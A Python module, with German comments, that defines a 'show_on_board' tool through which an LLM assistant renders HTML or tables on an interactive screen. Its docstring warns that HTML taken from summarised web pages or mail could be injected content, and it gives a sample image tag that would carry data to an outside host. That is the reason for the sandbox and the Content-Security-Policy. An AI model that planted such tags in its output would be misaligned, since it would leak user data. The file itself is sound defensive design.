"""BoardTools: Werkzeug, mit dem das Sprachmodell selbst etwas aufs Board bringt.

show_on_board(title, html | text / columns + rows)

Das Werkzeug zeigt nichts direkt an - es gibt die gewünschte Ansicht im ToolResult mit
(ToolResult.view). Der Assistent hängt sie an seine Antwort (AssistantReply.view), der Viewer
zeigt sie im Board. Zwei Formen:
  - html:  eigenes HTML des Modells -> HtmlView. Bruchstücke bekommen den Rahmen der Vorlage
           templates/board_html.html.j2 (Überschrift, Schrift und Farben wie die anderen Ansichten).
  - text / columns + rows: die Standardvorlage (templates/default.html.j2) -> TemplateView.

Eingaben: Knöpfe, Links und Felder im HTML funktionieren ohne Skripte - der Viewer hört von außen
mit und schickt Antippen/Eingaben als Chat-Nachricht des Nutzers ("Auf dem Board angetippt: ...",
viewer/js/assistant.js: hookBoardInput). Das Modell sieht sie wie jede andere Nachricht.

Sicherheit: Das HTML kann aus fremden Quellen stammen (das Modell fasst z. B. eine Webseite oder
Mail zusammen und übernimmt deren Inhalt). Deshalb
  - läuft es im Board in einer Sandbox ohne Skripte (viewer/js/stage.js: showOnBoard),
  - bekommt es eine Content-Security-Policy, die jedes Nachladen aus dem Netz sperrt - sonst
    könnte ein eingeschleustes <img src="https://fremd/?daten..."> Inhalte nach außen tragen.
"""
from __future__ import annotations

import html as html_lib
import re
from pathlib import Path
from typing import Any

from backend import config
from backend.assistant.tools import ToolResult, ToolSpec
from backend.rendering import ViewRenderer
from backend.views import HtmlView, TemplateView

TOOL_NAME = "show_on_board"
MAX_HTML_CHARS = 200_000
MAX_ROWS = 200
# Nichts aus dem Netz: nur eingebettete Styles und Bilder als data:-URL
CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:"
_CSP_META = f'<meta http-equiv="Content-Security-Policy" content="{CSP}">'
_FULL_DOCUMENT = re.compile(r"^\s*(<!doctype|<html)", re.I)
_HEAD = re.compile(r"<head[^>]*>", re.I)
_HTML_TAG = re.compile(r"<html[^>]*>", re.I)

_SPEC = ToolSpec(
    TOOL_NAME,
    "Show something on the board, the large screen next to you. Use it whenever content is easier to read "
    "than to hear: tables, lists, comparisons, step-by-step instructions, code, overviews. "
    "Either pass 'html' (the body content as HTML; inline CSS is fine, scripts and anything loaded from the "
    "internet such as remote images do not work), or pass 'text' and/or 'columns' with 'rows' for a simple "
    "page with a table. Afterwards tell the user in one short sentence what the board shows - do not read "
    "the content aloud. "
    "The board is interactive: you may add <button>, links, <input>, <select>, <textarea> and checkboxes "
    "(give fields a name or a <label>). When the user taps a button or link you get a user message "
    "'Auf dem Board angetippt: ...' with the button text and all filled-in fields; pressing Enter in a field "
    "sends 'Auf dem Board eingegeben: ...'. Use this for choices, quizzes and small forms; then react and, "
    "if useful, call show_on_board again with the updated page.",
    {
        "type": "object",
        "properties": {
            "title": {"type": "string", "description": "Heading shown at the top of the board"},
            "html": {"type": "string", "description": "Body content as HTML, e.g. '<ul><li>...</li></ul>'"},
            "text": {"type": "string", "description": "Plain paragraph under the heading (instead of html)"},
            "columns": {"type": "array", "items": {"type": "string"}, "description": "Table header (with rows)"},
            "rows": {"type": "array", "items": {"type": "array", "items": {"type": "string"}},
                     "description": "Table rows, each a list of cells (instead of html)"},
        },
        "required": ["title"],
    },
)


class BoardTools:
    """Erfüllt ToolProvider (backend/assistant/tools.py)."""

    def __init__(self, template_dir: Path | None = None):
        self._renderer = ViewRenderer(template_dir or config.TEMPLATE_DIR)

    def list_tools(self) -> list[ToolSpec]:
        return [_SPEC]

    def call_tool(self, name: str, arguments: dict[str, Any]) -> ToolResult:
        if name != TOOL_NAME:
            return ToolResult(f"Unbekanntes Werkzeug: {name!r}", is_error=True)
        title = _text(arguments.get("title"))
        html = arguments.get("html")
        text = _text(arguments.get("text"))
        rows = _rows(arguments.get("rows"))
        if isinstance(html, str) and html.strip():
            if len(html) > MAX_HTML_CHARS:
                return ToolResult(f"html is too long ({len(html)} characters, at most {MAX_HTML_CHARS}).",
                                  is_error=True)
            view = HtmlView(self._document(title, html))
        elif text or rows:
            data: dict[str, Any] = {"title": title or "Board", "text": text, "rows": rows}
            columns = arguments.get("columns")
            if isinstance(columns, list) and columns:
                data["columns"] = [_text(column) for column in columns]
            view = TemplateView("default", data)
        else:
            return ToolResult("Nothing to show: pass 'html', or 'text', or 'columns' with 'rows'.", is_error=True)
        return ToolResult("The board now shows this. Tell the user in one short sentence what it shows.", view=view)

    def _document(self, title: str, html: str) -> str:
        """Ganzes Dokument des Modells: nur die Sperre fürs Nachladen einsetzen.
        Bruchstück: in den Rahmen der Vorlage (Überschrift + Styles der anderen Ansichten)."""
        if _FULL_DOCUMENT.match(html):
            for pattern in (_HEAD, _HTML_TAG):
                match = pattern.search(html)
                if match:
                    return html[:match.end()] + _CSP_META + html[match.end():]
            return _CSP_META + html
        return self._renderer.render(TemplateView("board_html", {"title": title, "body": html, "csp": CSP}))


def _text(value: Any) -> str:
    return html_lib.unescape(str(value)).strip() if value is not None else ""


def _rows(value: Any) -> list[list[str]]:
    """Zeilen als Listen von Texten - kleine Modelle schicken auch mal Text statt Liste je Zeile."""
    if not isinstance(value, list):
        return []
    rows = []
    for row in value[:MAX_ROWS]:
        cells = row if isinstance(row, list) else list(row.values()) if isinstance(row, dict) else [row]
        rows.append(["" if cell is None else str(cell) for cell in cells])
    return rows
